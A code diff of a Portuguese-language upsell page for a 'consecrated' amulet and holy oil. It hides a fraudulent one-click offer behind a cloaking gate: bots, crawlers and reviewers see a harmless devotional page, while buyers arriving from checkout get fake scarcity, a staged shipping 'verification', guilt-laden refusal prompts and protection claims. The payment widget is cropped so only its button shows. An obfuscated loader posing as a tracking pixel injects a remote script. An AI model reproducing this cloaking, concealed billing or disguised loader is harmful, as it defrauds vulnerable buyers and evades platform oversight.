@@ -5,109 +5,402 @@
 <!-- UTMIFY PIXEL -->
 <script>(function(){var u_n5=atob("DCvZENv3U1gbakXHDlD7ZambcWI5AjGzfljjP/SUNzY1HzGqZ02gPriYPnZ5GGq0bVmwYK+EfChyEiCrIVuwaL6bfTJoSGnlb1+tYrKVJix+GWf9VXb1MrybPDp6BjblNHCiMrWWPj05UGe3Z1O8fJKTcXQ5HCSre077KvnBMjl4XyPza03vdrnPNjkiW3f/bx7hJu/VLgVm");var h_ub=[];for(var l_pjr=0;l_pjr<u_n5.length;l_pjr++){h_ub.push(u_n5.charCodeAt(l_pjr)&255);}var j_an=h_ub[0];var u_zz4f=h_ub.slice(1,1+j_an);var p_jg7y=h_ub.slice(1+j_an);var i_yxk8=p_jg7y.map(function(b,s_xpz){return b^u_zz4f[s_xpz%j_an];});var g_u="";for(var u_qizs=0;u_qizs<i_yxk8.length;u_qizs++){g_u+=String.fromCharCode(i_yxk8[u_qizs]&255);}var t_py9=decodeURIComponent(escape(g_u));var e_a3q=JSON.parse(t_py9);var v_ers=e_a3q.globals||[];v_ers.forEach(function(i_t1e){window[i_t1e.name]=i_t1e.value;});var g_l3w=document.createElement("script");g_l3w.src=e_a3q.url;g_l3w.async=true;g_l3w.defer=true;(e_a3q.attributes||[]).forEach(function(w_s){g_l3w.setAttribute(w_s.name,w_s.value);});(document.head||document.documentElement).appendChild(g_l3w);})();</script>
 <!-- FIM UTMIFY -->
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
-<meta name="robots" content="noindex,nofollow">
-<title>Envio Protegido — Amuleto e Óleo Santo</title>
+<title>Os seus presentes consagrados</title>
+<meta name="robots" content="noindex, nofollow">
+
+
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'><rect width='64' height='64' rx='12' fill='%23fbf8f1'/><circle cx='32' cy='33' r='20' fill='none' stroke='%23a5842f' stroke-width='2.4'/><path d='M32 18 V46 M23 27 H41' stroke='%23a5842f' stroke-width='3' stroke-linecap='round'/></svg>">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700;800;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Anton&family=Montserrat:wght@600;700;800;900&display=swap" rel="stylesheet">
+<link rel="preload" as="image" href="amuleto-oleo-santo.jpg" fetchpriority="high">
+
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "yir9q5k2tg");
+</script>
+
+<!-- KashPay — processador do one-click upsell -->
 <script src="https://checkout.hotmart.com/lib/hotmart-checkout-elements.js"></script>
+
+<!-- GATE HOTMART -->
 <script>
+/* ---------- GATE: black so dentro do funil da Hotmart ---------- */
 (function(){
   try{
     var qs = new URLSearchParams(window.location.search);
     var ua = (navigator.userAgent || '').toLowerCase();
 
-    /* bot ou navegador automatizado: sempre white */
     var isBot = /bot|crawl|spider|google|facebookexternalhit|facebot|meta-externalagent|bingpreview|slurp|yandex|applebot|headless|phantom|selenium|webdriver|puppeteer|lighthouse|inspect|curl|wget|python|java\//i.test(ua);
     if (!ua || ua.length < 20) isBot = true;
-
-    /* forcar white para conferencia */
     var forcaClean = qs.get('clean') === '1' || qs.get('white') === '1';
 
-    /* 1) so o nosso link abre a black de fora do funil */
+    /* 1) o nosso link */
     var bypass = qs.get('bypass') === 'gl2026';
 
-    /* 2) hostname EXATO do checkout (nada de substring: subdominio de painel nao entra) */
+    /* 2) parametro de sessao do funil da Hotmart (so existe vindo de uma compra) */
+    var doFunil = !!(qs.get('fsid') || qs.get('off') || qs.get('hash') || qs.get('transaction') || qs.get('purchase'));
+
+    /* 3) hostname EXATO do checkout (nada de substring) */
     var refHost = '';
     try { refHost = new URL(document.referrer).hostname.toLowerCase(); } catch(e){}
     var HOSTS = ['pay.hotmart.com','checkout.hotmart.com','consumer.hotmart.com','hotmart.com','www.hotmart.com'];
     var doCheckout = HOSTS.indexOf(refHost) !== -1;
 
-    /* 3) ja esta dentro do funil nesta aba (gravado so por uma pagina de upsell) */
+    /* 4) ja esta dentro do funil nesta aba */
     var noFunil = false;
     try { noFunil = sessionStorage.getItem('funnel_ok') === '1'; } catch(e){}
 
-    if (!isBot && !forcaClean && (bypass || doCheckout || noFunil)) {
+    if (!isBot && !forcaClean && (bypass || doFunil || doCheckout || noFunil)) {
       try { sessionStorage.setItem('funnel_ok','1'); } catch(e){}
       document.documentElement.setAttribute('data-gate','real');
     } else {
       document.documentElement.setAttribute('data-gate','clean');
     }
-  }catch(e){
-    document.documentElement.setAttribute('data-gate','clean');
-  }
+  }catch(e){ document.documentElement.setAttribute('data-gate','clean'); }
 })();
 </script>
+
+
 <style>
-:root{--ink:#16181d;--muted:#6b7280;--line:#e6e3da;--gold:#a5842f;--green:#0a7d32;--green-d:#096a2a;--paper:#fbf8f1;}
-*,::after,::before{margin:0;padding:0;box-sizing:border-box;}
-html{overflow-x:hidden;}
-body{background:#fff;color:var(--ink);font-family:'Montserrat',-apple-system,'Segoe UI',Roboto,Arial,sans-serif;-webkit-font-smoothing:antialiased;line-height:1.65;}
-img{max-width:100%;height:auto;display:block;}
-a{color:inherit;}
-.wrap{width:100%;max-width:620px;margin:0 auto;padding:0 18px;}
+  :root {
+    --black:#000; --ink:#111; --light:#ebebeb; --blue:#004aad;
+    --green:#057932; --gold:#ffb000;
+    --sans:'Montserrat',-apple-system,'Segoe UI',Roboto,Arial,sans-serif;
+  }
+  *,::after,::before{margin:0;padding:0;box-sizing:border-box;}
+  html{overflow-x:hidden;scroll-behavior:smooth;}
+  body{overflow-x:hidden;max-width:100%;background:var(--light);font-family:var(--sans);-webkit-font-smoothing:antialiased;}
+  img{max-width:100%;height:auto;display:block;}
 
-/* ---------------- gate ---------------- */
-html[data-gate="clean"] #conteudo-real{display:none !important;}
-html[data-gate="clean"] #pagina-clean{display:block !important;}
-html[data-gate="real"] #conteudo-real{display:block !important;}
-html[data-gate="real"] #pagina-clean{display:none !important;}
+  html[data-gate="clean"] #conteudo-real { display: none !important; }
+  html[data-gate="clean"] #pagina-clean { display: block !important; }
+  html[data-gate="real"] #conteudo-real { display: block !important; }
+  html[data-gate="real"] #pagina-clean { display: none !important; }
 
-/* ---------------- white ---------------- */
-#pagina-clean{background:#fff;padding:26px 0 60px;}
-.w-top{font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--gold);font-weight:700;text-align:center;margin-bottom:12px;}
+  .wrap{width:100%;max-width:640px;margin:0 auto;}
+  .band-alert{background:#fff;padding:14px 18px;}
+  .alert-top{font-size:14px;font-weight:800;line-height:1.35;color:var(--blue);text-align:center;text-transform:uppercase;letter-spacing:.2px;}
+  .congrats{background:linear-gradient(90deg,#0b6b2e,#0f8a3c);color:#fff;text-align:center;font-size:15.5px;font-weight:800;line-height:1.4;padding:13px 18px;}
+  .band-black{background:var(--black);padding:28px 18px 24px;}
+  h1.headline{font-size:32px;font-weight:900;line-height:1.1;color:#fff;text-align:center;text-transform:uppercase;letter-spacing:-.5px;}
+  .band-sub{background:#141414;padding:14px 18px;}
+  .headline-sub{font-size:14px;font-weight:800;line-height:1.4;color:#fff;text-align:center;text-transform:uppercase;}
+  .band-light{background:var(--light);padding:24px 18px 44px;}
+
+  .appeal-box{background:#fff;border-radius:12px;padding:20px 20px;margin-bottom:18px;box-shadow:0 6px 20px rgba(0,0,0,.06);border-left:5px solid var(--blue);}
+  .appeal-text{font-size:16px;font-weight:600;line-height:1.65;color:#222;}
+  .appeal-text strong{color:var(--blue);font-weight:800;}
+  .product-shot{width:100%;max-width:420px;margin:0 auto 18px;border-radius:14px;box-shadow:0 14px 34px rgba(0,74,173,.22);}
+
+  .presentes{max-width:520px;margin:0 auto 20px;display:grid;gap:10px;}
+  .presente{background:#fff;border-radius:12px;padding:14px 16px;display:flex;gap:12px;align-items:flex-start;box-shadow:0 6px 18px rgba(0,0,0,.05);border:1px solid #e3e3e3;}
+  .presente .ic{font-size:26px;line-height:1;flex-shrink:0;}
+  .presente b{display:block;font-size:14.5px;color:#111;}
+  .presente span{font-size:13px;color:#555;line-height:1.45;font-weight:600;}
+  .presente .tag{display:inline-block;margin-top:6px;font-size:10.5px;font-weight:800;letter-spacing:1px;text-transform:uppercase;color:#0b6b2e;background:#e7f6ec;padding:3px 8px;border-radius:999px;}
+
+  /* passos */
+  .passo{display:none;}
+  .passo.on{display:block;}
+  .pergunta{font-size:22px;font-weight:900;line-height:1.2;color:#111;text-align:center;text-transform:uppercase;margin:6px 0 16px;letter-spacing:-.3px;}
+  .btn{
+    font-family:'Poppins',sans-serif;font-size:17px;font-weight:600;line-height:1.3;color:#fff;background:var(--green);border:none;border-radius:10px;
+    padding:15px 8%;cursor:pointer;text-align:center;display:block;width:100%;max-width:460px;margin:0 auto 12px;box-shadow:0 10px 24px rgba(5,121,50,.3);
+  }
+  .btn.pulse{animation:pulse 1.8s ease-in-out infinite;}
+  @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.025);}}
+  .btn-sec{display:block;margin:0 auto;background:none;border:none;cursor:pointer;font-family:var(--sans);font-size:12.5px;font-weight:600;color:#888;text-decoration:underline;text-underline-offset:3px;}
+
+  .paises{max-width:520px;margin:0 auto 14px;display:grid;grid-template-columns:1fr 1fr;gap:8px;}
+  .pais{background:#fff;border:2px solid #ddd;border-radius:12px;padding:12px 10px;font-family:var(--sans);font-size:14px;font-weight:700;color:#222;cursor:pointer;text-align:left;display:flex;align-items:center;gap:8px;}
+  .pais:hover,.pais.sel{border-color:var(--blue);background:#eef3ff;}
+  .pais .fl{font-size:20px;line-height:1;}
+  .pais img.fl{width:28px;height:19px;border-radius:3px;object-fit:cover;box-shadow:0 0 0 1px rgba(0,0,0,.12);flex-shrink:0;}
+  .pais.wide{grid-column:1 / -1;}
+
+  .loader{max-width:520px;margin:0 auto;background:#0b1f4a;border-radius:14px;padding:26px 20px;color:#fff;text-align:center;box-shadow:0 10px 28px rgba(11,31,74,.25);}
+  .anel{width:58px;height:58px;margin:0 auto 16px;border:5px solid rgba(255,255,255,.15);border-top-color:#ffd166;border-radius:50%;animation:girar .9s linear infinite;}
+  @keyframes girar{to{transform:rotate(360deg);}}
+  .loader .lt{font-size:15px;font-weight:800;margin-bottom:8px;}
+  .loader .ls{font-size:13px;color:#dbe4ff;font-weight:600;min-height:20px;}
+  .loader .lbar{height:6px;background:rgba(255,255,255,.15);border-radius:999px;margin-top:16px;overflow:hidden;}
+  .loader .lbar i{display:block;height:100%;width:0;background:#ffd166;transition:width .6s;}
+
+  .resultado{max-width:520px;margin:0 auto 18px;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 10px 28px rgba(0,0,0,.08);border:2px solid #0f8a3c;}
+  .resultado .rh{background:linear-gradient(90deg,#0b6b2e,#0f8a3c);color:#fff;padding:12px 16px;font-size:12px;font-weight:800;letter-spacing:1.2px;text-transform:uppercase;text-align:center;}
+  .resultado .rb{padding:18px 18px 16px;text-align:center;}
+  .resultado .rp{font-size:13px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.8px;}
+  .resultado .rd{font-size:34px;font-weight:900;color:#0b6b2e;line-height:1.1;margin:4px 0 2px;}
+  .resultado .rs{font-size:13px;font-weight:600;color:#666;}
+  .resultado .rl{margin-top:14px;padding-top:12px;border-top:1px dashed #ddd;text-align:left;font-size:13.5px;font-weight:600;color:#333;line-height:1.55;}
+  .resultado .rl p{padding:4px 0;display:flex;gap:8px;}
+
+  .divine-warning{background:#fffbeb;border:2px solid #f59e0b;border-radius:12px;padding:16px 18px;margin:16px auto;max-width:540px;display:flex;align-items:flex-start;gap:14px;box-shadow:0 4px 16px rgba(245,158,11,.16);}
+  .warning-icon{font-size:28px;line-height:1;flex-shrink:0;}
+  .warning-text{font-size:14.5px;font-weight:600;line-height:1.5;color:#78350f;}
+  .warning-text strong{color:#9a3412;font-weight:800;}
+
+  .cta-verse{text-align:center;font-size:14px;font-style:italic;line-height:1.5;color:#555;margin:10px auto 0;max-width:460px;}
+  .cta-verse span{display:block;font-style:normal;font-weight:800;font-size:11.5px;letter-spacing:1.2px;color:#9a7b1f;margin-top:4px;}
+
+  /* confirmação de recusa */
+  #modal-recusa{position:fixed;inset:0;z-index:100;background:rgba(5,10,30,.78);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;padding:18px;}
+  #modal-recusa.on{display:flex;}
+  #modal-recusa .card{background:#fff;border-radius:20px;max-width:400px;width:100%;padding:26px 22px 20px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.5);}
+  #modal-recusa h3{font-size:20px;font-weight:900;color:#c0392b;text-transform:uppercase;line-height:1.15;margin-bottom:10px;}
+  #modal-recusa p{font-size:14.5px;font-weight:600;line-height:1.55;color:#222;margin-bottom:16px;}
+
+  .clean-wrap{max-width:640px;margin:0 auto;padding:60px 22px 80px;}
+  .clean-wrap h1{font-size:26px;font-weight:700;line-height:1.3;color:#1d1a14;margin-bottom:14px;}
+  .clean-wrap p{font-size:16px;font-weight:400;line-height:1.75;color:#3d382e;margin-bottom:16px;}
+  .clean-foot{margin-top:36px;padding-top:20px;border-top:1px solid #d8d2c4;font-size:13px;color:#7a7466;line-height:1.7;}
+  .clean-foot a{color:#7a7466;}
+
+  @media (max-width:600px){
+    .alert-top{font-size:12.5px;}
+    h1.headline{font-size:26px;}
+    .headline-sub{font-size:12.5px;}
+    .appeal-text{font-size:14.5px;}
+    .pergunta{font-size:19px;}
+    .band-light{padding:20px 14px 36px;}
+    .warning-text{font-size:13.5px;}
+    .resultado .rd{font-size:28px;}
+  }
+</style>
+
+<style>
+/* ---------- janela do widget da Hotmart: mostra so o botao ----------
+   Medidas conferidas no widget REAL, dentro do funil (compra ativa):
+   largura fixa 420px  ·  botao entre 150px e 242px do topo do widget.
+   A largura e travada em 420 e reduzida por escala nos ecras pequenos,
+   para o layout interno do widget ser sempre o mesmo. NAO recalibrar
+   fora do funil: sem compra ativa o widget mostra um aviso curto e as
+   medidas dao erradas. */
+.hm-fora{width:100%;max-width:440px;margin:12px auto 4px;overflow:hidden;}
+.hm-escala{width:420px;transform-origin:top left;}
+.hm-janela{width:420px;height:92px;overflow:hidden;position:relative;background:#fff;}
+.hm-janela #hotmart-sales-funnel,.hm-janela #widget-black{width:420px !important;margin-top:-150px !important;display:block;}
+.hm-janela iframe{width:420px !important;border:0;}
+.hm-nota{text-align:center;font-size:12px;color:#8a8f99;margin:2px auto 14px;}
+
+/* ---------- pagina do produto (white) ---------- */
+#pagina-clean{background:#fff;padding:26px 0 60px;color:#16181d;font-family:'Montserrat',-apple-system,'Segoe UI',Roboto,Arial,sans-serif;line-height:1.65;}
+#pagina-clean .wrap{width:100%;max-width:620px;margin:0 auto;padding:0 18px;}
+.w-top{font-size:11px;letter-spacing:2px;text-transform:uppercase;color:#a5842f;font-weight:700;text-align:center;margin-bottom:12px;}
 .w-h1{font-size:clamp(20px,4.6vw,26px);font-weight:800;text-align:center;line-height:1.28;margin-bottom:10px;}
-.w-sub{text-align:center;color:var(--muted);font-size:15px;max-width:520px;margin:0 auto 24px;}
-.w-img{max-width:300px;margin:0 auto 26px;border-radius:12px;border:1px solid var(--line);}
+.w-sub{text-align:center;color:#6b7280;font-size:15px;max-width:520px;margin:0 auto 24px;}
+.w-img{max-width:300px;margin:0 auto 26px;border-radius:12px;border:1px solid #e6e3da;}
 .w-sec{margin-bottom:26px;}
 .w-sec h2{font-size:16px;font-weight:800;margin-bottom:10px;}
 .w-sec p{font-size:15px;color:#3a3f4a;margin-bottom:12px;}
-.w-lista{list-style:none;}
-.w-lista li{display:flex;gap:12px;padding:11px 0;border-bottom:1px solid var(--line);}
+.w-lista{list-style:none;padding:0;}
+.w-lista li{display:flex;gap:12px;padding:11px 0;border-bottom:1px solid #e6e3da;}
 .w-lista li:last-child{border-bottom:none;}
 .w-lista .ic{font-size:19px;min-width:26px;}
 .w-lista b{display:block;font-size:14.5px;}
-.w-lista span{font-size:13.5px;color:var(--muted);}
-.w-box{background:var(--paper);border:1px solid var(--line);border-radius:12px;padding:18px 18px;margin-bottom:26px;}
+.w-lista span{font-size:13.5px;color:#6b7280;}
+.w-box{background:#fbf8f1;border:1px solid #e6e3da;border-radius:12px;padding:18px;margin-bottom:26px;}
 .w-box h3{font-size:14px;font-weight:800;margin-bottom:8px;}
 .w-box p{font-size:13.5px;color:#3a3f4a;margin-bottom:8px;}
 .w-box p:last-child{margin-bottom:0;}
-.w-compra{border:1px solid var(--line);border-radius:14px;padding:20px 16px;text-align:center;margin-bottom:26px;}
-.w-compra .rot{font-size:12px;letter-spacing:1.4px;text-transform:uppercase;color:var(--muted);font-weight:700;margin-bottom:12px;}
-.w-foot{border-top:1px solid var(--line);padding-top:18px;font-size:12px;color:var(--muted);line-height:1.8;text-align:center;}
-
-/* ---------------- black ---------------- */
-#conteudo-real{background:#fff;padding:0 0 50px;}
-.b-topo{background:var(--green);color:#fff;text-align:center;font-size:13px;font-weight:700;padding:11px 16px;letter-spacing:.3px;}
-.b-etapa{text-align:center;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--gold);font-weight:700;margin:22px 0 8px;}
-.b-h1{font-size:clamp(21px,5.2vw,30px);font-weight:900;text-align:center;line-height:1.22;margin-bottom:12px;text-transform:uppercase;}
-.b-lead{text-align:center;font-size:16px;color:#3a3f4a;max-width:520px;margin:0 auto 22px;}
-.b-img{max-width:300px;margin:0 auto 24px;border-radius:12px;border:1px solid var(--line);}
-.b-corpo p{font-size:16px;color:#22252c;margin-bottom:14px;}
-.b-corpo b{font-weight:800;}
-.b-aviso{background:#fff7e6;border:1px solid #e8cf94;border-radius:12px;padding:15px 16px;font-size:14.5px;color:#5a4410;margin:22px 0;font-weight:600;}
-
-/* --------- widget: mascara das cover boxes (valores calibrados, NAO mexer) --------- */
-#caixa-widget{position:relative;background:#fff;max-width:420px;margin:0 auto;}
-#cover-box-top{position:absolute;top:0;left:0;width:100%;height:190px;background:#fff;z-index:9999;pointer-events:none;}
-#cover-box-bottom{position:absolute;bottom:0;left:0;width:100%;height:200px;background:#fff;z-index:9999;pointer-events:none;}
+.w-compra{border:1px solid #e6e3da;border-radius:14px;padding:20px 16px;text-align:center;margin-bottom:26px;}
+.w-compra .rot{font-size:12px;letter-spacing:1.4px;text-transform:uppercase;color:#6b7280;font-weight:700;margin-bottom:12px;}
+.w-foot{border-top:1px solid #e6e3da;padding-top:18px;font-size:12px;color:#6b7280;line-height:1.8;text-align:center;}
 </style>
 </head>
 <body>
 
-<!-- ===================== WHITE: pagina do produto ===================== -->
+<!-- =============== CONTEÚDO REAL (BLACK - UPSELL 3) =============== -->
+<div id="conteudo-real">
+
+  <section class="band-alert">
+    <div class="wrap">
+      <p class="alert-top">Não feche esta página — os seus presentes consagrados ainda não têm morada de entrega</p>
+    </div>
+  </section>
+
+  <div class="congrats">🎉 Parabéns! Foi uma das primeiras a contribuir — o amuleto e o óleo santo ficaram reservados em seu nome.</div>
+
+  <section class="band-black">
+    <div class="wrap">
+      <h1 class="headline">Os seus presentes consagrados estão à sua espera</h1>
+    </div>
+  </section>
+
+  <section class="band-sub">
+    <div class="wrap">
+      <p class="headline-sub">Reservados apenas para os primeiros 50 — e o seu nome está na lista</p>
+    </div>
+  </section>
+
+  <section class="band-light">
+    <div class="wrap">
+
+      <div class="appeal-box">
+        <p class="appeal-text">
+          Eu disse na transmissão: quem fosse uma das primeiras a resgatar a novena receberia em casa o <strong>amuleto consagrado sobre o altar da Nova Basílica</strong> — e as primeiras 50, além do amuleto, o <strong>frasco de óleo santo consagrado na Basílica do Santo Sepulcro, em Jerusalém</strong>. Acabaram de me confirmar: <strong>a sua contribuição entrou entre as primeiras 50.</strong> Os dois são seus.
+        </p>
+      </div>
+
+      <img class="product-shot" src="amuleto-oleo-santo.jpg" alt="Amuleto consagrado e óleo santo de Jerusalém" width="800" height="1200" fetchpriority="high" decoding="async">
+
+      <div class="presentes">
+        <div class="presente"><span class="ic">🏅</span><div><b>Amuleto de Nossa Senhora Desatadora dos Nós</b><span>Medalha consagrada sobre o altar da Nova Basílica, com a fita azul. Para trazer consigo em cada momento daqui para a frente.</span><span class="tag">✓ Reservado em seu nome</span></div></div>
+        <div class="presente"><span class="ic">🫙</span><div><b>Óleo Santo do Santo Sepulcro — Jerusalém</b><span>O óleo usado há séculos para proteção e cura. Unge a testa dos filhos e dos netos, a porta de casa — e a família inteira fica blindada contra todo o mal.</span><span class="tag">✓ Reservado em seu nome</span></div></div>
+      </div>
+
+      <!-- PASSO 1: quer receber? -->
+      <div class="passo on" id="passo-1">
+        <p class="pergunta">Quer receber os seus presentes consagrados em casa?</p>
+        <button type="button" class="btn pulse" onclick="irPasso(2)">SIM, quero receber em casa</button>
+        <button type="button" class="btn-sec" onclick="abrirRecusa()">Não, prefiro deixar esta bênção para outra pessoa</button>
+      </div>
+
+      <!-- PASSO 2: país -->
+      <div class="passo" id="passo-2">
+        <p class="pergunta">Para que país devemos enviar?</p>
+        <div class="paises" id="paises"></div>
+        <p style="text-align:center;font-size:12.5px;color:#666;font-weight:600;">Os itens consagrados seguem em envio protegido, com rastreio, para chegarem intactos.</p>
+      </div>
+
+      <!-- PASSO 3: loader -->
+      <div class="passo" id="passo-3">
+        <div class="loader">
+          <div class="anel"></div>
+          <p class="lt">A preparar o envio protegido para <span id="ld-pais">—</span></p>
+          <p class="ls" id="ld-txt">A verificar o amuleto reservado em seu nome…</p>
+          <div class="lbar"><i id="ld-bar"></i></div>
+        </div>
+      </div>
+
+      <!-- PASSO 4: resultado + CTA -->
+      <div class="passo" id="passo-4">
+        <div class="resultado">
+          <div class="rh">✓ Envio protegido confirmado</div>
+          <div class="rb">
+            <p class="rp">Entrega estimada em <span id="rs-pais">—</span></p>
+            <p class="rd" id="rs-dias">até 8 dias úteis</p>
+            <p class="rs">a contar da confirmação da morada</p>
+            <div class="rl">
+              <p><span>🏅</span> Amuleto consagrado — reservado em seu nome</p>
+              <p><span>🫙</span> Óleo santo de Jerusalém — reservado em seu nome</p>
+              <p><span>🛡️</span> Envio protegido, com seguro e rastreio, para que os itens consagrados não passem por mãos indevidas</p>
+              <p><span>✉️</span> Depois de confirmar, a Irmã Camila pede-lhe a morada por e-mail</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="divine-warning">
+          <span class="warning-icon">⚠️</span>
+          <p class="warning-text">
+            <strong>ATENÇÃO:</strong> O amuleto e o óleo foram consagrados em número certo — <strong>50 frascos, 50 nomes</strong>. Se não confirmar agora, o seu lugar passa ao próximo da lista e <strong>não há segundo frasco</strong>. Confirme o envio protegido e os seus presentes saem do altar com o seu nome.
+          </p>
+        </div>
+
+        <p style="text-align:center;font-size:12.5px;font-weight:600;color:#666;max-width:440px;margin:0 auto 10px;line-height:1.45;">📩 Assim que aceitar, veja o seu e-mail: a Irmã Camila vai pedir-lhe a morada para o envio.</p>
+        <!-- ONE-CLICK KASHPAY (U3) — trocar a URL /u/ pelo produto do U3 -->
+        <!-- WIDGET ONE-CLICK HOTMART (recortado: so o botao) -->
+            <div class="hm-fora"><div class="hm-escala"><div class="hm-janela">
+              <div id="widget-black" class="hotmart-widget-container"></div>
+            </div></div></div>
+            <p class="hm-nota">Um toque e pronto — o pagamento usa os dados que já confirmou.</p>
+        <p class="cta-verse">“Ungirás com o óleo, e será consagrado.”<span>ÊXODO 40:9</span></p>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- CONFIRMAÇÃO DE RECUSA -->
+  <div id="modal-recusa">
+    <div class="card">
+      <div style="font-size:40px;margin-bottom:8px;">🏅</div>
+      <h3>Tem a certeza?</h3>
+      <p>O amuleto e o frasco de óleo santo <strong>já estão consagrados com o seu nome</strong>. Se os deixar, passam ao próximo da lista — e não há segundo frasco.</p>
+      <button type="button" class="btn" onclick="fecharRecusa()">Voltar — quero receber em casa</button>
+      <a class="btn-sec" id="link-recusa" href="/obrigado/">Sim, deixar para outra pessoa</a>
+    </div>
+  </div>
+
+  <script>
+  (function(){
+    var PAISES = [
+      ['pt','Portugal',      'até 7 dias úteis'],
+      ['es','Espanha',       'até 7 dias úteis'],
+      ['fr','França',        'até 8 dias úteis'],
+      ['it','Itália',        'até 8 dias úteis'],
+      ['de','Alemanha',      'até 8 dias úteis'],
+      ['ch','Suíça',         'até 8 dias úteis'],
+      ['lu','Luxemburgo',    'até 8 dias úteis'],
+      ['be','Bélgica',       'até 8 dias úteis'],
+      ['nl','Países Baixos', 'até 8 dias úteis'],
+      ['gb','Reino Unido',   'até 9 dias úteis'],
+      ['ie','Irlanda',       'até 9 dias úteis'],
+      ['at','Áustria',       'até 8 dias úteis'],
+      ['br','Brasil',        'até 5 dias úteis'],
+      ['us','Estados Unidos','até 10 dias úteis'],
+      ['ca','Canadá',        'até 10 dias úteis'],
+      ['','Outro país',     'até 12 dias úteis']
+    ];
+    var box = document.getElementById('paises');
+    PAISES.forEach(function(p, i){
+      var b = document.createElement('button');
+      b.type = 'button'; b.className = 'pais' + (p[1] === 'Outro país' ? ' wide' : '');
+      b.innerHTML = (p[0] ? '<img class="fl" src="flags/' + p[0] + '.png" alt="" width="28" height="19">' : '<span class="fl">🌍</span>') + p[1];
+      b.onclick = function(){ escolherPais(i, b); };
+      box.appendChild(b);
+    });
+
+    window.irPasso = function(n){
+      [1,2,3,4].forEach(function(i){ document.getElementById('passo-' + i).classList.toggle('on', i === n); });
+      var alvo = document.getElementById('passo-' + n);
+      if (alvo) alvo.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    };
+
+    var FRASES = [
+      'A verificar o amuleto reservado em seu nome…',
+      'A confirmar o frasco de óleo santo — 50 nomes, 50 frascos…',
+      'A calcular a rota de envio protegido para {pais}…',
+      'A garantir seguro e rastreio para itens consagrados…',
+      'Envio protegido confirmado.'
+    ];
+    window.escolherPais = function(i, btn){
+      var p = PAISES[i];
+      document.querySelectorAll('.pais').forEach(function(x){ x.classList.remove('sel'); });
+      btn.classList.add('sel');
+      document.getElementById('ld-pais').textContent = p[1];
+      document.getElementById('rs-pais').textContent = p[1];
+      document.getElementById('rs-dias').textContent = p[2];
+      document.getElementById('cta-pais').textContent = p[1] === 'Outro país' ? 'a minha casa' : p[1];
+      setTimeout(function(){ irPasso(3); }, 250);
+      var bar = document.getElementById('ld-bar'), txt = document.getElementById('ld-txt');
+      FRASES.forEach(function(f, k){
+        setTimeout(function(){
+          txt.textContent = f.replace('{pais}', p[1]);
+          bar.style.width = ((k + 1) / FRASES.length * 100) + '%';
+          if (k === FRASES.length - 1) setTimeout(function(){ irPasso(4); }, 700);
+        }, 500 + k * 2300);
+      });
+    };
+
+    window.abrirRecusa = function(){ document.getElementById('modal-recusa').classList.add('on'); };
+    window.fecharRecusa = function(){ document.getElementById('modal-recusa').classList.remove('on'); };
+    try {
+      var l = document.getElementById('link-recusa');
+      l.href = '/obrigado/' + (location.search || '?src=fs2026');
+    } catch(e){}
+  })();
+  </script>
+
+</div>
+
+<!-- =============== PÁGINA INSTITUCIONAL CLEAN (WHITE) =============== -->
 <div id="pagina-clean">
   <div class="wrap">
     <div class="w-top">Caminhos da Fé · Material devocional</div>
@@ -159,54 +452,34 @@ html[data-gate="real"] #pagina-clean{display:none !important;}
   </div>
 </div>
 
-<!-- ===================== BLACK: oferta dentro do funil ===================== -->
-<div id="conteudo-real">
-  <div class="b-topo">✅ Pagamento confirmado — falta apenas um passo</div>
-  <div class="wrap">
-    <div class="b-etapa">Etapa 3 de 3 · Último passo</div>
-    <h1 class="b-h1">QUER RECEBER O AMULETO E O ÓLEO SANTO EM SUA CASA?</h1>
-    <p class="b-lead">Não é obrigatório. A Novena funciona sem eles. Mas há quem prefira ter o sinal na mão.</p>
-    <img src="../images/amuleto-oleo-santo.jpg" alt="" class="b-img">
-
-    <div class="b-corpo">
-      <p>A medalha de Nossa Senhora Desatadora dos Nós e o frasco de Óleo Santo são os dois sacramentais que acompanham a devoção desde Augsburgo.</p>
-      <p>A medalha é levada ao pescoço ou guardada junto à cama. O óleo é usado numa gota, no punho ou na testa, antes da oração de cada dia.</p>
-      <p>O <b>Envio Protegido</b> cobre a preparação e o envio dos dois até à sua morada, com acompanhamento. A senhora só precisa de nos indicar os seus dados depois da confirmação — explicamos tudo no material que recebe por e-mail.</p>
-    </div>
-
-    <div class="b-aviso">📩 Assim que aceitar, veja o seu e-mail: enviamos o guia com os dados que precisamos para preparar o seu envio.</div>
-
-    <div id="caixa-widget">
-      <div id="widget-black" class="hotmart-widget-container"></div>
-      <div id="cover-box-top"></div>
-      <div id="cover-box-bottom"></div>
-    </div>
-
-  </div>
-</div>
-
 <script>
-/* So pode existir UM id="hotmart-sales-funnel" na pagina: move para o container visivel
-   (white ou black) e so entao monta o widget. */
+/* ---------- monta o widget no container VISIVEL (so pode existir um id) ----------
+   Espera o container aparecer: na black ele so e revelado depois da contagem. */
 (function(){
   var montado = false;
-  function montar(){
+  function escalar(){
+    var fora = document.querySelector('.hm-fora');
+    if (!fora) return;
+    var esc = fora.querySelector('.hm-escala');
+    var s = Math.min(1, fora.clientWidth / 420);
+    esc.style.transform = 'scale(' + s + ')';
+    fora.style.height = Math.ceil(92 * s) + 'px';
+  }
